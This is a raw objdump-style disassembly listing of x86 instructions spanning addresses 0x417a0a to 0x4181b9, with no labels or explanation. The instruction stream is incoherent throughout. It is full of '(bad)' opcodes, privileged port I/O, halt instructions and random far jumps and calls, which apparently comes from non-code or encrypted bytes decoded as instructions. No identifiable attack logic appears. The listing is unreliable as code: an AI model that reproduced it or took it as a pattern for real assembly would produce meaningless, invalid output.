  417a0a:	fisubr DWORD PTR [edx]
  417a0c:	sti    
  417a0d:	aaa    
  417a0e:	and    eax,0x6b87ac61
  417a13:	sbb    al,0xaf
  417a15:	les    ebp,FWORD PTR [eax]
  417a17:	jle    0x4179fd
  417a19:	je     0x4179ed
  417a1b:	inc    esp
  417a1c:	es sbb bl,ch
  417a1f:	clc    
  417a20:	xor    eax,0xa32d348
  417a25:	ja     0x417a7c
  417a27:	xchg   ebp,eax
  417a28:	mov    ecx,0xa24199fb
  417a2d:	pusha  
  417a2e:	out    0xad,al
  417a30:	(bad)  
  417a31:	arpl   WORD PTR [ebx-0xbbc368a],ax
  417a37:	(bad)  
  417a38:	das    
  417a39:	mov    bl,0xe1
  417a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a3c:	cmp    eax,0x94c322cd
  417a41:	enter  0xee90,0x65
  417a45:	test   eax,eax
  417a47:	push   ds
  417a48:	or     al,0x48
  417a4a:	push   DWORD PTR [esi]
  417a4c:	cmp    al,0x4a
  417a4e:	in     al,0x36
  417a50:	shr    ah,0xa2
  417a53:	pushf  
  417a54:	pop    ebp
  417a55:	push   esi
  417a56:	scas   al,BYTE PTR es:[edi]
  417a57:	sub    eax,0xedc9f190
  417a5c:	dec    ebx
  417a5d:	fisubr WORD PTR cs:[eax]
  417a60:	xor    ecx,edx
  417a62:	cmp    ah,bl
  417a64:	mov    DWORD PTR [eax],edx
  417a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a67:	sbb    al,0x95
  417a69:	mov    ebp,0x703a105a
  417a6e:	ss jb  0x417a58
  417a71:	mov    cl,0x3e
  417a73:	test   BYTE PTR [eax+0xa],bh
  417a76:	rcl    ecx,0x44
  417a79:	call   0xa6ad96e1
  417a7e:	dec    ecx
  417a7f:	and    dh,al
  417a81:	cwde   
  417a82:	or     bh,BYTE PTR [ebx+ebp*2+0x5c689ecb]
  417a89:	cmc    
  417a8a:	and    edi,esp
  417a8c:	inc    esi
  417a8d:	mov    BYTE PTR [ecx],dl
  417a8f:	sbb    dl,BYTE PTR [ebx]
  417a91:	aad    0x1d
  417a93:	xchg   ebx,eax
  417a94:	retf   0x7fa5
  417a97:	lods   eax,DWORD PTR ds:[esi]
  417a98:	test   eax,0x6d74629d
  417a9d:	mov    ds:0x2f3d79a0,eax
  417aa2:	fwait
  417aa3:	jb     0x417a2f
  417aa5:	jmp    0x417aaa
  417aa7:	pop    edi
  417aa8:	and    eax,0x2234571f
  417aad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aae:	rol    BYTE PTR [edx-0x76],cl
  417ab1:	jno    0x417b2e
  417ab3:	dec    edx
  417ab4:	call   DWORD PTR [ecx-0x59]
  417ab7:	lods   al,BYTE PTR ds:[esi]
  417ab8:	mov    edx,0xb6cf7689
  417abd:	ficom  DWORD PTR [esi-0x33]
  417ac0:	rcr    BYTE PTR [ebp-0x317454ac],cl
  417ac6:	ret    
  417ac7:	fnstsw WORD PTR [edi-0x5c9fbc33]
  417acd:	jmp    0x4a70:0xddf382a2
  417ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ad5:	jnp    0x417a80
  417ad7:	arpl   WORD PTR [edi+0x7fa0cebd],cx
  417add:	rcr    ah,cl
  417adf:	(bad)  
  417ae0:	not    bh
  417ae2:	(bad)
  417ae5:	mov    ss,eax
  417ae7:	mov    dh,BYTE PTR [eax-0x78]
  417aea:	cld    
  417aeb:	cwde   
  417aec:	or     BYTE PTR [ecx-0x2c],0xf5
  417af0:	out    dx,eax
  417af1:	mov    ebx,0x51b9965e
  417af6:	push   edi
  417af7:	mov    esp,0x1927ce70
  417afc:	mov    ds:0x4fb761b8,al
  417b01:	sbb    bh,BYTE PTR [edi]
  417b03:	aam    0x1f
  417b05:	fisub  WORD PTR [esi-0x777e7a85]
  417b0b:	xor    dl,BYTE PTR [eax]
  417b0d:	fiadd  DWORD PTR [ebp-0x7d]
  417b10:	iret   
  417b11:	inc    eax
  417b12:	add    BYTE PTR [eax-0x32],cl
  417b15:	sti    
  417b16:	std    
  417b17:	ins    BYTE PTR es:[edi],dx
  417b18:	mov    dh,0xb0
  417b1a:	mov    cl,BYTE PTR [eax+0x77f7fe7e]
  417b20:	ret    
  417b21:	and    BYTE PTR [eax],dh
  417b23:	push   cs
  417b24:	xor    eax,0x656aaf03
  417b29:	rol    DWORD PTR [edx+edi*8+0x38],cl
  417b2d:	rol    DWORD PTR [edi+0x3265f3c2],1
  417b33:	in     al,0xde
  417b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b37:	sub    eax,ebx
  417b39:	imul   edx,DWORD PTR [eax-0x43],0x3d
  417b3d:	cmp    al,BYTE PTR [edi]
  417b3f:	inc    ebx
  417b40:	outs   dx,BYTE PTR ds:[esi]
  417b41:	inc    esi
  417b42:	in     eax,0x19
  417b44:	mov    dl,0xc3
  417b46:	into   
  417b47:	push   ds
  417b48:	sbb    esp,DWORD PTR [eax]
  417b4a:	dec    edx
  417b4b:	dec    ebp
  417b4c:	xchg   esp,eax
  417b4d:	(bad)  
  417b4e:	jecxz  0x417b9e
  417b50:	mul    ecx
  417b52:	inc    esp
  417b53:	lods   eax,DWORD PTR ds:[esi]
  417b54:	imul   eax,DWORD PTR [edx-0xa],0x25
  417b58:	int    0x9b
  417b5a:	mov    edi,0x798fa002
  417b5f:	pop    ebx
  417b60:	and    DWORD PTR [edi-0x64db915b],edx
  417b66:	add    ch,BYTE PTR [edx]
  417b68:	jmp    0xf8b7:0x8eb5061a
  417b6f:	push   ebx
  417b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b71:	xchg   edi,edx
  417b73:	xchg   ecx,eax
  417b75:	ins    BYTE PTR es:[edi],dx
  417b76:	add    cl,bh
  417b78:	dec    ebx
  417b79:	jns    0x417bae
  417b7b:	mov    bh,0xe0
  417b7d:	adc    edx,esi
  417b7f:	cmp    ch,BYTE PTR [ebx]
  417b81:	or     bh,al
  417b83:	cld    
  417b84:	mov    ds:0x2f65ffca,al
  417b89:	test   bl,bl
  417b8b:	adc    eax,0x27127c22
  417b90:	mov    al,ds:0x3e5dc790
  417b95:	mov    al,ds:0x85c11e49
  417b9a:	or     ebp,DWORD PTR [edx]
  417b9c:	or     ch,0x68
  417b9f:	xor    bh,BYTE PTR [edx]
  417ba1:	jne    0x417bb9
  417ba3:	push   edi
  417ba4:	push   edx
  417ba5:	sbb    DWORD PTR cs:[eax+eax*2-0x67695182],0x5f
  417bae:	cdq    
  417baf:	add    eax,0xd42fe73
  417bb4:	dec    edi
  417bb5:	rol    BYTE PTR [ecx-0x56886f71],cl
  417bbb:	retf   
  417bbc:	fsub   QWORD PTR [ebx-0x196debc1]
  417bc2:	cmp    bh,BYTE PTR [ecx+0x59]
  417bc5:	jnp    0x417be1
  417bc7:	mov    al,bh
  417bc9:	add    BYTE PTR [esi+0x72],bh
  417bcc:	enter  0x38f7,0xf3
  417bd0:	cwde   
  417bd1:	je     0x417b96
  417bd3:	scas   eax,DWORD PTR es:[edi]
  417bd4:	jecxz  0x417bed
  417bd6:	mov    ebp,0x424943a2
  417bdb:	js     0x417b8a
  417bdd:	data16 loope 0x417b98
  417be0:	pop    edi
  417be1:	ins    DWORD PTR es:[edi],dx
  417be2:	imul   edx,DWORD PTR [ebx-0x10f80a7e],0x3a
  417be9:	mov    BYTE PTR [ecx+esi*2],bh
  417bec:	(bad)  
  417bed:	push   edx
  417bee:	mov    ds:0x378aaa85,eax
  417bf3:	fisttp QWORD PTR [ebx+0x6e1640c1]
  417bf9:	inc    eax
  417bfa:	stos   BYTE PTR es:[edi],al
  417bfb:	fwait
  417bfc:	clc    
  417bfd:	retf   0xc1d8
  417c00:	ins    DWORD PTR es:[edi],dx
  417c01:	sbb    BYTE PTR ds:0xcffcd470,bh
  417c07:	sub    dh,BYTE PTR [ebp+0x718804cc]
  417c0d:	nop
  417c0e:	mov    BYTE PTR [ecx],bl
  417c10:	(bad)  
  417c11:	dec    ebx
  417c12:	stos   DWORD PTR es:[edi],eax
  417c13:	sti    
  417c14:	jl     0x417bb7
  417c16:	jae    0x417ba0
  417c18:	lahf   
  417c19:	mov    esp,ebx
  417c1b:	jnp    0x417be5
  417c1d:	scas   eax,DWORD PTR es:[edi]
  417c1e:	add    BYTE PTR [eax],ah
  417c20:	mov    eax,0x9a4f8ba1
  417c25:	psubd  mm4,mm4
  417c28:	scas   eax,DWORD PTR es:[edi]
  417c29:	(bad)  
  417c2a:	(bad)  
  417c2b:	hlt    
  417c2c:	retf   
  417c2d:	mov    ?,WORD PTR [esi+0x2e7a7525]
  417c33:	sbb    eax,0xe60d1fc5
  417c38:	pop    ebx
  417c39:	(bad)  
  417c3a:	jae    0x417c4c
  417c3c:	lahf   
  417c3d:	pusha  
  417c3e:	pushf  
  417c3f:	mov    ah,0x6b
  417c41:	add    BYTE PTR [ebp-0x26821e86],ch
  417c47:	sbb    eax,0x1822f264
  417c4c:	arpl   WORD PTR [edx],si
  417c4e:	ins    DWORD PTR es:[edi],dx
  417c4f:	xchg   esi,ebp
  417c51:	ins    DWORD PTR es:[edi],dx
  417c52:	push   esi
  417c53:	dec    edx
  417c54:	loopne 0x417c74
  417c56:	mov    cs,WORD PTR [eax+ebx*1-0x4c]
  417c5a:	mov    ds:0x58324e42,al
  417c5f:	leave  
  417c60:	mov    esp,0x727de833
  417c65:	nop
  417c66:	mov    edi,0x7de4ba01
  417c6b:	addr16 pop edx
  417c6d:	fcmovne st,st(6)
  417c6f:	pusha  
  417c70:	pop    eax
  417c71:	adc    eax,0xf04b3414
  417c76:	test   BYTE PTR [edi],dl
  417c78:	fistp  DWORD PTR [eax-0x59]
  417c7b:	and    BYTE PTR ds:0x654a1659,0x30
  417c82:	rol    DWORD PTR [ecx],1
  417c84:	mov    edi,0x2977cfd2
  417c89:	adc    ebx,eax
  417c8b:	scas   eax,DWORD PTR es:[edi]
  417c8c:	and    bh,BYTE PTR ds:0xf0dd468f
  417c92:	pop    ss
  417c93:	jne    0x417c54
  417c95:	pop    ebx
  417c96:	inc    eax
  417c97:	aam    0x50
  417c99:	mov    eax,ds:0x1abb2c8b
  417c9e:	inc    esp
  417c9f:	sub    eax,0xa9ddc3b8
  417ca4:	stos   BYTE PTR es:[edi],al
  417ca5:	add    eax,0xa0797e43
  417caa:	cli    
  417cab:	cmp    eax,DWORD PTR [eax+0x2]
  417cae:	out    0xa5,al
  417cb0:	scas   al,BYTE PTR es:[edi]
  417cb1:	inc    ebx
  417cb2:	mov    ds:0xb0f0aa04,al
  417cb7:	mov    dh,0x23
  417cb9:	ja     0x417c3b
  417cbb:	push   esp
  417cbc:	push   esi
  417cbd:	sub    al,0x5a
  417cbf:	loope  0x417c6a
  417cc1:	jne    0x417c5b
  417cc3:	(bad)  
  417cc4:	(bad)  
  417cc5:	fsub   st(1),st
  417cc7:	push   ebx
  417cc8:	jecxz  0x417c9a
  417cca:	dec    eax
  417ccb:	jmp    FWORD PTR [eax-0x6357f182]
  417cd1:	add    DWORD PTR [edx],0x419b42d
  417cd7:	jns    0x417c6b
  417cd9:	outs   dx,DWORD PTR ds:[esi]
  417cda:	in     eax,0x12
  417cdc:	sub    ch,al
  417cde:	aad    0xc2
  417ce0:	inc    eax
  417ce1:	mov    eax,ds:0x2609200e
  417ce6:	mov    DWORD PTR [eax-0x7a3965ff],ecx
  417cec:	xor    eax,0x218201e7
  417cf1:	fcmovu st,st(0)
  417cf3:	dec    ebp
  417cf4:	mov    edi,0x7191ab2f
  417cf9:	inc    edx
  417cfa:	fwait
  417cfb:	push   eax
  417cfc:	mov    dl,0x3f
  417cfe:	popa   
  417cff:	jg     0x417cac
  417d01:	test   BYTE PTR [esi+0xa0e2ae6],dl
  417d07:	loopne 0x417d36
  417d09:	fnsave [eax-0x44]
  417d0c:	pushf  
  417d0d:	sub    dh,al
  417d0f:	mov    ds:0xd7a189da,eax
  417d14:	dec    eax
  417d15:	cmp    ch,ch
  417d17:	adc    ecx,edi
  417d19:	jle    0x417cd8
  417d1b:	mov    esp,0x89e2ecc7
  417d20:	or     BYTE PTR [edx-0x4d],0xce
  417d24:	sub    BYTE PTR [esi+0x2d995ab3],0xea
  417d2b:	lock or cl,BYTE PTR [eax-0x763fb9b1]
  417d32:	lahf   
  417d33:	lahf   
  417d34:	mov    ds:0xcf7f0f68,al
  417d39:	pop    ecx
  417d3a:	retf   0x5135
  417d3d:	xchg   edx,eax
  417d3e:	mov    ds:0x73df4861,eax
  417d43:	out    0x90,eax
  417d45:	rcr    DWORD PTR [ebx+0x60],1
  417d48:	xor    eax,0x50d668b8
  417d4d:	gs jmp 0x417d7d
  417d50:	hlt    
  417d51:	or     eax,0xcf587b88
  417d56:	mov    dl,0xce
  417d58:	push   0x4f1ccf74
  417d5d:	in     al,0x17
  417d5f:	ret    0x7467
  417d62:	cmp    eax,0x3a35921e
  417d67:	outs   dx,BYTE PTR ds:[esi]
  417d68:	and    eax,0x8af8c530
  417d6d:	(bad)  
  417d6e:	xchg   ebx,eax
  417d6f:	xchg   ebp,eax
  417d70:	sbb    ecx,eax
  417d72:	cwde   
  417d73:	mov    ecx,esp
  417d75:	ja     0x417d03
  417d77:	fist   WORD PTR [esi+0x7e]
  417d7a:	test   BYTE PTR [esi-0x76],bh
  417d7d:	mov    BYTE PTR [ecx],dh
  417d7f:	adc    ebx,DWORD PTR [edx]
  417d81:	out    0xe6,al
  417d83:	arpl   WORD PTR [esi+edx*2+0x73],si
  417d87:	rol    edx,cl
  417d89:	push   edx
  417d8a:	sbb    DWORD PTR [eax+0x2b],ebx
  417d8d:	cmp    al,0xdd
  417d8f:	mov    DWORD PTR ds:0x20d4a58f,eax
  417d95:	mov    ah,0xbd
  417d97:	xor    al,BYTE PTR [esi+0x28915295]
  417d9d:	ss mov ah,0x45
  417da0:	cmp    BYTE PTR [edi+0x32],0xe8
  417da4:	hlt    
  417da5:	lods   eax,DWORD PTR ds:[esi]
  417da6:	xor    al,BYTE PTR [ecx]
  417da8:	adc    esp,0x44
  417dab:	sub    ebp,DWORD PTR [ebx]
  417dad:	mov    al,0x90
  417daf:	mov    esi,0xe498eb34
  417db4:	cwde   
  417db5:	bound  esp,QWORD PTR [edx-0x1e802a7b]
  417dbb:	enter  0xd7b3,0xcc
  417dbf:	mov    ch,0xb8
  417dc1:	out    0xd6,eax
  417dc3:	out    dx,al
  417dc4:	jbe    0x417dfa
  417dc6:	jl     0x417da9
  417dc8:	jle    0x417d60
  417dca:	sti    
  417dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dcc:	test   eax,0xfb42dc
  417dd1:	inc    edx
  417dd2:	in     al,dx
  417dd3:	jecxz  0x417e19
  417dd5:	hlt    
  417dd6:	call   0x8bb6:0x15dfa1af
  417ddd:	sahf   
  417dde:	fadd   DWORD PTR [esi-0x62482abc]
  417de4:	mov    eax,0xa0b6f401
  417de9:	jns    0x417e42
  417deb:	push   ecx
  417dec:	pop    edx
  417ded:	sub    bh,bl
  417def:	xchg   bh,dh
  417df1:	xor    ecx,edi
  417df3:	sub    al,0xca
  417df5:	and    ecx,DWORD PTR [ebx-0x3d8491a5]
  417dfb:	cli    
  417dfc:	and    BYTE PTR [edi],ah
  417dfe:	retf   
  417dff:	push   edi
  417e00:	jns    0x417e71
  417e02:	sbb    DWORD PTR [ebx],esi
  417e04:	pushf  
  417e05:	scas   eax,DWORD PTR es:[edi]
  417e06:	jno    0x417e28
  417e08:	inc    esp
  417e09:	in     al,dx
  417e0a:	scas   al,BYTE PTR es:[edi]
  417e0b:	mov    dh,0x8
  417e0d:	aam    0x8e
  417e0f:	shl    edi,0x6
  417e12:	sbb    BYTE PTR [eax+0x70755143],dl
  417e18:	addr16 mov edi,0x1e54f0ae
  417e1e:	adc    al,0xef
  417e20:	shl    DWORD PTR [edx-0x69534083],cl
  417e26:	scas   eax,DWORD PTR es:[edi]
  417e27:	jmp    0x417e1c
  417e29:	mov    ds:0x6d234565,eax
  417e2e:	leave  
  417e2f:	sbb    eax,0xb72ff0de
  417e34:	or     bh,ah
  417e36:	or     eax,0x95c23148
  417e3b:	mov    cl,0x30
  417e3d:	push   0x5c
  417e3f:	push   0x4b
  417e41:	push   ds
  417e42:	pop    ss
  417e43:	mov    WORD PTR [esi],es
  417e45:	dec    edx
  417e46:	push   ebp
  417e47:	jo     0x417e02
  417e49:	pop    es
  417e4a:	dec    ebp
  417e4b:	fcomp  QWORD PTR [ecx+eiz*8]
  417e4e:	sub    DWORD PTR ds:0x81bcff00,esi
  417e54:	mov    eax,0x3be67f59
  417e59:	xor    esp,ebx
  417e5b:	add    al,0xff
  417e5d:	xchg   ebp,eax
  417e5e:	jle    0x417e0a
  417e60:	in     eax,0xe6
  417e62:	push   0xa05374b
  417e67:	popf   
  417e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e69:	xchg   DWORD PTR [ebp-0x27],ebx
  417e6c:	shl    BYTE PTR [edi],1
  417e6e:	and    ah,0x3a
  417e71:	hlt    
  417e72:	popa   
  417e73:	arpl   ax,si
  417e75:	loope  0x417ef5
  417e77:	push   edi
  417e78:	sub    edi,DWORD PTR [edx]
  417e7a:	and    BYTE PTR [ebp-0x5a],cl
  417e7d:	push   ss
  417e7e:	das    
  417e7f:	(bad)  
  417e80:	cmp    eax,0x1df910c7
  417e85:	test   BYTE PTR [eax],al
  417e87:	xor    al,0x3
  417e89:	std    
  417e8a:	jne    0x417e7e
  417e8c:	cli    
  417e8d:	pusha  
  417e8e:	xchg   esp,eax
  417e8f:	clc    
  417e90:	jne    0x417e96
  417e92:	addr16 inc esp
  417e94:	inc    edx
  417e95:	lock shr BYTE PTR [ebx],1
  417e98:	inc    esi
  417e99:	cmp    bl,ch
  417e9b:	sub    al,0xd7
  417e9d:	pop    ecx
  417e9e:	sub    ebx,edi
  417ea0:	push   ds
  417ea1:	push   ebp
  417ea2:	xor    bl,BYTE PTR ds:0x58cc26de
  417ea8:	and    al,0x2a
  417eaa:	stc    
  417eab:	bound  ebx,QWORD PTR [eax+0x753e9ca4]
  417eb1:	sbb    dh,cl
  417eb3:	pop    es
  417eb4:	das    
  417eb5:	inc    edx
  417eb6:	or     al,0x38
  417eb8:	inc    eax
  417eb9:	cmp    ebp,ebp
  417ebb:	mov    ebp,0x19c037d9
  417ec0:	mov    dh,0x1c
  417ec2:	call   0xa225:0xb47d4cbb
  417ec9:	add    DWORD PTR [ecx-0x12081aa2],edi
  417ecf:	xor    eax,0x76f535fc
  417ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ed5:	test   eax,0xe513c6be
  417eda:	push   ss
  417edb:	int3   
  417edc:	leave  
  417edd:	jecxz  0x417ece
  417edf:	adc    al,0x9e
  417ee1:	and    DWORD PTR [edi-0x48e0e0ac],esp
  417ee7:	or     dh,BYTE PTR [ecx+0x4a95796]
  417eed:	cmp    DWORD PTR [edx+0x55],esp
  417ef0:	xchg   edx,eax
  417ef1:	jg     0x417e77
  417ef3:	retf   
  417ef4:	ins    BYTE PTR es:[edi],dx
  417ef5:	(bad)  
  417ef6:	cmp    esp,esi
  417ef8:	or     BYTE PTR [edx+ebx*2],dh
  417efb:	push   0xffffffb5
  417efd:	xchg   ebp,eax
  417efe:	out    0xc6,eax
  417f00:	sbb    edi,DWORD PTR [eax-0x4d]
  417f03:	je     0x417f0e
  417f05:	fsub   QWORD PTR [ebp+ebp*1-0x66]
  417f09:	xchg   edi,eax
  417f0a:	(bad)  
  417f0b:	stos   DWORD PTR es:[edi],eax
  417f0c:	add    al,0x3f
  417f0e:	jg     0x417ee1
  417f10:	xor    BYTE PTR [ebx-0x70],bl
  417f13:	and    bl,BYTE PTR [esi-0x5]
  417f16:	iret   
  417f17:	pusha  
  417f18:	stos   BYTE PTR es:[edi],al
  417f19:	sub    al,BYTE PTR [bx+0x7536]
  417f1e:	sbb    DWORD PTR [ebp+0x6e],esi
  417f21:	pop    es
  417f22:	sbb    ah,BYTE PTR [edi-0x37]
  417f25:	loop   0x417ec3
  417f27:	push   edi
  417f28:	mov    DWORD PTR [ecx+ecx*4+0x47],eax
  417f2c:	mov    edx,0xfde2f521
  417f31:	test   eax,0xcfb0c541
  417f36:	mov    al,ds:0x88292525
  417f3b:	inc    esi
  417f3c:	or     al,0x12
  417f3e:	pop    esi
  417f3f:	xlat   BYTE PTR ds:[ebx]
  417f40:	jo     0x417f2c
  417f42:	add    BYTE PTR [esi],ah
  417f44:	call   0x63120234
  417f49:	mov    ecx,0x9a049e0
  417f4e:	adc    dh,BYTE PTR [edx+ebp*8+0x46]
  417f52:	(bad)  
  417f53:	pop    ss
  417f54:	std    
  417f55:	pushf  
  417f56:	(bad)  
  417f57:	pushf  
  417f58:	mov    ebp,ebp
  417f5a:	retf   
  417f5b:	js     0x417fdc
  417f5d:	pop    esi
  417f5e:	sub    DWORD PTR [ebx+0x12b0dbe4],ebx
  417f64:	mov    ebp,0x336470f1
  417f69:	inc    esi
  417f6a:	mov    esp,0x1853ecc1
  417f6f:	fnstsw WORD PTR [esi+0x2]
  417f72:	call   0x5cec:0x51643cab
  417f79:	rol    BYTE PTR [edx],1
  417f7b:	cwde   
  417f7c:	and    dl,bh
  417f7e:	fsub   QWORD PTR [ecx+0xe]
  417f81:	xor    bl,cl
  417f83:	mov    dl,0x51
  417f85:	fwait
  417f86:	push   edx
  417f87:	jo     0x417f67
  417f89:	mov    al,ds:0x5f170caa
  417f8e:	test   BYTE PTR [edi-0x5d],bh
  417f91:	inc    ebp
  417f92:	or     al,0x6a
  417f94:	sbb    BYTE PTR ds:0xbf45de9a,bh
  417f9a:	aas    
  417f9b:	mov    al,ds:0x84c6d71e
  417fa0:	in     al,dx
  417fa1:	enter  0x5d72,0x24
  417fa5:	ins    DWORD PTR es:[edi],dx
  417fa6:	xlat   BYTE PTR ds:[ebx]
  417fa7:	xor    BYTE PTR [ebx-0x36ad6dbb],0xf8
  417fae:	(bad)  
  417faf:	jmp    0x417f43
  417fb1:	xchg   esp,eax
  417fb2:	outs   dx,BYTE PTR ds:[esi]
  417fb3:	sti    
  417fb4:	enter  0x4187,0x45
  417fb8:	(bad)  
  417fb9:	call   0xab817af7
  417fbe:	imul   esi,DWORD PTR [edi+0x19],0x6500102
  417fc5:	lea    ebx,[ebp-0x2d]
  417fc8:	jmp    0x417fbf
  417fca:	xor    BYTE PTR [eax-0x56eae2b6],ah
  417fd0:	rol    DWORD PTR ds:[ebx],cl
  417fd3:	cmp    edi,DWORD PTR [ecx+edi*2]
  417fd6:	mov    ebp,0xb02c5034
  417fdb:	inc    ecx
  417fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fdd:	inc    ebx
  417fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fdf:	ret    0xfa1d
  417fe2:	repz cmc 
  417fe4:	xchg   esi,eax
  417fe5:	shl    DWORD PTR [eax],1
  417fe7:	and    eax,0x4034f629
  417fec:	jbe    0x418013
  417fee:	mov    esi,0xca159a47
  417ff3:	fsubr  st,st(5)
  417ff5:	mov    dl,0x1
  417ff7:	adc    ah,BYTE PTR [esi]
  417ff9:	push   ebx
  417ffa:	mov    cl,0x10
  417ffc:	sbb    eax,0x407f7a76
  418001:	jno    0x418015
  418003:	scas   al,BYTE PTR es:[edi]
  418004:	stos   DWORD PTR es:[edi],eax
  418005:	std    
  418006:	or     edx,esi
  418008:	sar    BYTE PTR [ecx-0x4f85e09b],0x73
  41800f:	sbb    bh,BYTE PTR [edx]
  418011:	bound  ecx,QWORD PTR [ecx+0x2b]
  418014:	retf   0x9688
  418017:	clc    
  418018:	xchg   edi,eax
  418019:	xor    eax,DWORD PTR [esi-0x4150bc57]
  41801f:	mov    bh,0x3
  418021:	je     0x418038
  418023:	fidivr WORD PTR [ecx-0x68]
  418026:	push   esp
  418027:	push   es
  418028:	dec    BYTE PTR [edi]
  41802a:	int3   
  41802b:	call   0xcc601cb9
  418030:	(bad)  [ebp*1-0x1ff16bd2]
  418037:	pop    ecx
  418038:	jmp    0x418067
  41803a:	daa    
  41803b:	cmp    DWORD PTR [ecx],eax
  41803d:	adc    DWORD PTR [edi-0x4],eax
  418040:	pop    ds
  418041:	push   esi
  418042:	inc    ebx
  418043:	repz (bad) 
  418045:	aad    0xc
  418047:	cmp    BYTE PTR [ebp-0x7],cl
  41804a:	dec    ebx
  41804b:	cmp    ch,BYTE PTR [ebp+0x55fb3e2e]
  418051:	inc    edi
  418052:	mov    esp,0xac5499ef
  418057:	xchg   BYTE PTR [ebp+0x5fef61f2],ah
  41805d:	ss xchg ebp,eax
  41805f:	cld    
  418060:	push   0x0
  418062:	adc    al,0xd8
  418064:	mov    ebp,0x77095381
  418069:	call   0xe41f:0x82c4354a
  418070:	add    ah,BYTE PTR [ebx]
  418072:	and    bl,BYTE PTR [edx+0x32]
  418075:	jl     0x41808f
  418077:	retf   
  418078:	repnz (bad) 
  41807a:	cwde   
  41807b:	daa    
  41807c:	daa    
  41807d:	aam    0xa3
  41807f:	inc    ebx
  418080:	outs   dx,BYTE PTR ds:[esi]
  418081:	std    
  418082:	sub    eax,0x59d3cbc9
  418087:	dec    ebx
  418088:	xor    edx,DWORD PTR [eax]
  41808a:	jmp    0x3318:0xd44d9ae6
  418091:	mov    al,0xa7
  418093:	test   eax,0x91038758
  418098:	mov    cl,0xb3
  41809a:	das    
  41809b:	(bad)  
  41809c:	leave  
  41809d:	xor    al,0x47
  41809f:	mov    edx,0x4f014da6
  4180a4:	icebp  
  4180a5:	jle    0x4180da
  4180a7:	pop    edi
  4180a8:	dec    edx
  4180a9:	(bad)  
  4180aa:	loop   0x4180c1
  4180ac:	and    eax,0x525a9583
  4180b1:	push   eax
  4180b2:	jne    0x41806e
  4180b4:	sbb    dl,BYTE PTR [ebp-0x727313a0]
  4180ba:	lock fdiv QWORD PTR [ecx-0x542b41bb]
  4180c1:	(bad)  
  4180c2:	lock pusha 
  4180c4:	mov    esi,0xaa502c31
  4180c9:	mov    DWORD PTR [edx+0xa],esi
  4180cc:	icebp  
  4180cd:	shl    BYTE PTR [ebx+ebp*1-0x5dec8bce],1
  4180d4:	add    al,0x44
  4180d6:	dec    esp
  4180d7:	rcl    ebp,1
  4180d9:	mov    WORD PTR [ebx+0x3425e4b5],fs
  4180df:	rcl    ebx,0x8d
  4180e2:	add    dh,cl
  4180e4:	adc    DWORD PTR [ebp-0x3a],edx
  4180e7:	rcr    DWORD PTR [ecx],cl
  4180e9:	push   ebx
  4180ea:	jecxz  0x4180bb
  4180ec:	std    
  4180ed:	fsub   DWORD PTR [ecx-0x78]
  4180f0:	lds    ebx,FWORD PTR [ebp+0x6fba9ce9]
  4180f6:	xor    eax,0xecc1dd62
  4180fb:	add    esp,DWORD PTR [eax]
  4180fd:	sahf   
  4180fe:	aam    0xfa
  418100:	pop    esp
  418101:	test   al,0xa1
  418103:	lock fcomp QWORD PTR [edx]
  418106:	inc    ebp
  418107:	adc    ebx,DWORD PTR [edi]
  418109:	gs dec ecx
  41810b:	xor    eax,0xfec3c296
  418110:	inc    edi
  418111:	daa    
  418112:	or     al,0xf7
  418114:	xor    bh,BYTE PTR [edx-0x6e]
  418117:	pop    es
  418118:	fnstcw WORD PTR [eax+0x48]
  41811b:	mov    DWORD PTR [eax],0x10dba55b
  418121:	jnp    0x418132
  418123:	mov    cl,0x5a
  418125:	add    bl,BYTE PTR [ebp-0x1ce764ca]
  41812b:	pop    ebx
  41812c:	ss pop eax
  41812e:	dec    edi
  41812f:	jmp    DWORD PTR ds:0x10cf3e98
  418135:	bound  esi,QWORD PTR [esi+eiz*8+0x4d]
  418139:	loope  0x418189
  41813b:	inc    ebp
  41813c:	je     0x4180cb
  41813e:	pop    esi
  41813f:	dec    edi
  418140:	fidivr WORD PTR [edi]
  418142:	in     al,dx
  418143:	or     dh,BYTE PTR [eax+0x6b84d554]
  418149:	sub    ch,BYTE PTR [edi-0x4cd8aaa1]
  41814f:	int    0x85
  418151:	imul   ebp,DWORD PTR [edi-0x6ed1acbd],0x32dba1f7
  41815b:	icebp  
  41815c:	mov    ds:0x5d88da20,eax
  418161:	sar    BYTE PTR [edx],cl
  418163:	sub    BYTE PTR [ecx-0x2c],dh
  418166:	das    
  418167:	les    esi,FWORD PTR [esi-0x2a]
  41816a:	add    al,0x61
  41816c:	adc    DWORD PTR [edi-0x4],ebp
  41816f:	push   cs
  418170:	and    ah,BYTE PTR [ebx-0x5b]
  418173:	shl    BYTE PTR [edi-0x3],1
  418176:	arpl   WORD PTR [eax],dx
  418178:	xor    DWORD PTR [esi],ebx
  41817a:	stos   DWORD PTR es:[edi],eax
  41817b:	jecxz  0x4181ef
  41817d:	cdq    
  41817e:	mov    ecx,0x1204b00f
  418183:	repz sbb eax,0xab2478a3
  418189:	jecxz  0x4181ae
  41818b:	dec    ebp
  41818c:	pop    edi
  41818d:	mov    eax,ecx
  41818f:	add    BYTE PTR [ecx+0xe],0x64
  418193:	xor    BYTE PTR [esp+ebp*8+0x3f7f6e0c],cl
  41819a:	imul   eax,DWORD PTR [edx-0x7644c805],0x22
  4181a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181a2:	cs pop edi
  4181a4:	aaa    
  4181a5:	adc    al,dh
  4181a7:	xor    BYTE PTR [edi-0x4ea55c0f],cl
  4181ad:	or     al,0x5c
  4181af:	(bad)  
  4181b0:	ins    BYTE PTR es:[edi],dx
  4181b1:	jae    0x418158
  4181b3:	std    
  4181b4:	int    0x93
  4181b6:	and    eax,DWORD PTR [ecx+0x73]
  4181b9:	sub    al,BYTE PTR [ebx]
